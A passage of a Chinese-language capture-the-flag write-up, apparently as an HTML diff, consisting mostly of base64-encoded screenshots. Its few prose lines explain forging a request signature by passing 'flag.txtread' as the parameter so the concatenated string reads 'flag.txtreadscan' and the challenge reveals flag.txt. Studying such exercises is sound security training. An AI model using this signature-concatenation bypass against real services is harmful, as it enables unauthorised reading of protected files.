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" alt="C @ I w-source:4d4d58e4-a3c7-433d-8985-1  1 32Sd8600b490f9f3bd8423fde7d4ac72 " loading="lazy"></figure>
+<p>325d8600b490f9f3bd8423fde7d43c72</p>
+<p>就知道了sign=</p>
+<p>325d8600b490f9f3bd8423fde7d43c72</p>
+<p>为什么要传入的参数是flag.txtread呢？</p>
+<p>因为它源码定义了action=scan.这在生成sign中是不可变的，又因为Exec方法中action必须有read和scan。所以定义为flag.txtread。</p>
+<p>因为在self.action中必须包含scan和read。于是令action为readscan。read和scan顺序不可换。因为在Getsign方法中param在action前面，最终组成flag.txtreadscan.</p>
+<figure data-type="image" tabindex="5"><img src="3.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="4.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABAAAAABKCAIAAACq87HNAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAACmrSURBVHhe7Z0LdFRVmqhPHjwSRBhjSFBAAyKiY0jodQHjIl6XYE8rpJTHqKPXEJDwCKjdI0i3SZQkPRfBaW0wQAIk0G0rDiSYBLEFemzDEB7eoZKwlNcALaAkBGxEExDyuP9+1Dn7vE9VqiqB/N86q7LfZ59/n9T5/33+vSukra1NQjqUK9fajje0fHOxhccpfSJCeoSHdA8P6RYmhYaE8FQEQRAEQRAEaR9oAHQw3zW2Vp9pbm7howB6/219w/r1DgXtn6UgCIIgCIIgiB9BA6AjqbvUevCba2wEevUIubtfeHTvUJqDIAiCIAiCIAEB1c0O4+T5ltozXPu/Oyb8wSHdUftHEARBEARBZOZmzOchv4IaZ8dQf6nl2LlmCISHSj+7o9udUWEsHUEQBEEQBEECChoAHcD3l1sPfsO1/zGDu0f1wlFAEARBEARBggSqnsGmrU2qPdPc2iaFhEgjB3WL7I6LfREEQRAEQZDggQZAsPn6u5bL14jj/z/eFt43EuVvz3vv/QkOHkEQBEEQBEF84vz5C3BAwKkC+qeN/7E8fzWPBJfqmoNHj/0PjwSew0eOri36w5Jlb7MDwgfcNTyPcurUaTh4xEuutkjHG4jzz603hfbv453fP5x0x86/lJdXwKfPHfAf7ndfWHmAhx3jXjnjhfQZmZ+c5XEEQRAEQRAkSJSVl+/YuRMCjrYBXVO0YXfV3oiInqtWvM2Tgshnn+9qbm6+rX//++69hycFBtCq3/9wMxgAPC5wz7C7/+WpKYMGDYQyYBW8OG82pPA8b/jqbPOZv5Mf/HpgcPfePZ06/+zeXVVWXnHhArHYZKKiolyuiQ8mJfG4M7ZlppfU8bAzYifn5jzWn0cUQJXPr5Zin8zL+4U+0wSwGVa5aSgxo3BeIg05gE3/P/fcsyx6Y9CwefqohYNLT2Q6FoNMw+ZpSQuGbDqZlcATkCDRZSVfnTN4qlRyLNv7m9Uad+7QScXwN9Wnf4TrCyLD40urNkyJ5gntg4hOwi8BpKOpKZxbeBD+xqeveGDv/IL6lOzs8bEs60aFXHK9Kyvr50G8zrkZ81fmr+CR9tHU1LTw1V9DYOmb/9f+DYCs/f96wa94UnD52ciE8PDwb8+e/fKrwzwpADDNHrT/YXcPnZH2/Mrl/75+7Sr4hPDAAbdDOuT+V9Ve+Gy6fJnX8ZLWNon93G9071CH2j8M1bv5K4uK14P2HxV1y7hxj6RMnACfEIaUoqL1kAtleGkHPJZXuG6twZE3idzLoJdr0tetNdL+gcS56zISpLotJUyjt4dq/2Aw0HO587O33chvAeBhPzRuWkkDj3qDOy9u8NDUzY6rNpSkwrnEQ31eUBQ8WXlOx0oADBWom+NDTQ4ozXIHnMmESsDgyK3mBWzQCl+QABxqIail54XYLRDa1DUoSkM7HEzU9JiurkevSHU4HkrojPP7UJSGU2n7DlFhjy/Zf+LYSar9Ww2TNcIN458R7FB8l0NwoDdJO74QzKnbsThj/mrV6/agUrc9F9Qs5SioZek1BfPn5uzwbt7MmNrVQvsdeKV+g6vCK0A3nT2CpyGdHLe7+jIFAjYGgKj9Dxo0kKcGl5t79w60DXD+/AWm2bsmPv7rhb8a++ADkZGRkA6fEM59I/OZp6ZA7tqiDT5r/8B3ja3sdcuAvk6df9YVFcMgRURETE+btvTNJc88/ZTLlQKfEIYUSIdcMA94ad9xl5TWxU5abDIrf3ZbZjpx3dEc+URFcOfr0g08fDzaP31d0P+xnIyEupIs7z2IrhMaNi8n05q+0LD59xt40AvGLtsHWpTnWD9ZnmMkOlZxailN37/0xCStZmlL9aqFu3jQNxoqv5pQ5enbprTKRaNs9dHETE95z7FvSTJc42xHk5064VdXSJs8TVUtS94wSVCqGj4/NFEWXUlq5cKk9mqQoB6NXiQtZZe8acjCJEGTBj2evkCgp6PDIfSEvBGS+DiWDF4wWqtjpZV4+kkOR/PlxKIYvaiSx+wANXr0oiH8LFXLjk8NsA1QXVEsJU9I9tyrVsNkAbnGySc89z8R+HVuA/gohxuAutq99TEpT3SMHln/ac78nL1jsvOJLkuOrJQYnuU36rbvjaO6MjnS768tvO5tgJq9B6WYMSMCOBFOTCZnUnJesqtTVl4OqiOwY+dfrAyAzqD9MwJtA2wp3wqa/fhxDz/pmsCT1AwfdndkRASP+Mrfm7i31S3O9v3cvbuquroGxmnhglcefJC4+hw+cqS8vAI+IQwpkA65YANASVrDRw68u8qdMOe3xlP9HDAPdC8HDA72JkHF2U9eE7R/xsh5ULIu/4Ub8j1AO5Rmd8ECp/qaAxpK3ikGxZEri9FT3lyWvGvBai+0unZYMh6iJ2crPg8J2SWpUuXHn3unoTVsXrCoMu1FZ64TeuEnZCtuEtFTloEtsaHCo1JFT8lUmk3MLE2TKrdWtkd/dK9eVJm85C3eKL3e4uVMIyXCTF6y39MZOhwb3uHaKul28tI3eT3ak+LfO56510MnxUd5cR8SyzN5aZXHyYcKytPzoGA1TOYQuaWVFHkGkQi8cmHB9awx+yaHIBI9ecMJ/zuDgQpes/dczJj4jvEeqSkrq+/nShd8V2LHvz4rngVHzFqx0h9uLbGPpitOIyNcrhipvr6eRxEkKID2eOHCd4mJCXCcPn3aVBPtPNo/I3A2wPnzF+BKo6Juefbpf+ZJaph3UHvm/hk/XGmFz8juIWGO9H9iqMHnjOnTZPkfOXykrLwCPlkU0p95+ikIQCJL8YGz27LJVH71Fm90cfJO4DUHFaDxGVlbJDAedEsF+j+Wsy4jtiTLUTvXEUTPS9sECpz3ECUsrWSTd1XPHKqUBg8xVI5J1th7B/AYPLqHDOEhZ4B2JS0rARXEfwwY7nVrDZUVld5M/1sL31IGA4aP5SEfaTh+XJKGCKOhXG/D51t3qbKk6IcmjOX2hkE9oSckVxxHexqOn5DA2CDvGZxdERGypnfJE5N3VXhpq/kNh7eqe2uxRjKJE9I6m8bcHrz9l71+ISr4/U886vdpd0fUEUU8Jjaoxkf9SVT+kcAD+u2RI0fhYFvIwAGJ48eNgwMCxqpoZ9P+GQGyAf7bTeZERyYav3r0l/YPXG0mbwB6hLOYDXBeMNTALElMVCZbht0zLGXiBPjkcfoegK0HgPI8ySvOfvJuaWxGhrV21f+xvELx/cDZbatK6mL7G70wIGo91/Xd776QnlkqTc5V1VWROHfd2jn9S1+f4cOGQjpEr02AOnQWql4J1hTOzcj9lPlyEn9TCJM3v1Bx8Xb+Zax2A1Wqi+lyYdqg+rVjQ8kroDQbaquig/W0kjM8VaFh86sLpCVzjKbWBO/woambv+GpthDtc9dXypmIIpk8/HYeA9Rd0uh67typxWkvTnGmd4o91LmwCxiYKyoHd73/Bp1Tf/whVRUTLIQvY6lMnzmk0dG9lTzV144fV67BwjxjVB4i42NQT9sTr4ieUiR6gulQL8wwd/WpPKS6ZLU01CNldS9ph5i2M7UY2l+YxFJ4QRntMKlXQdj5JomSVN+Z3J3Gye1KypALEU6tPa+NGEVvfr3TvJUwZWxtP2Ox046p+0M6wwtY5zLML42e0WwNgIG0SXkiYUEaBk5NxJkkfozwDBbd5QtrxK9uCvHL9xQQvoG5H4jwda2qBRhWjI0fEyMd/Ej+YlejWwNg3jf+WBHPon4GeagpWFMrcYOH9Ja0r26WlWPQB418KNdr+BRzVpgc9HFpISsr6II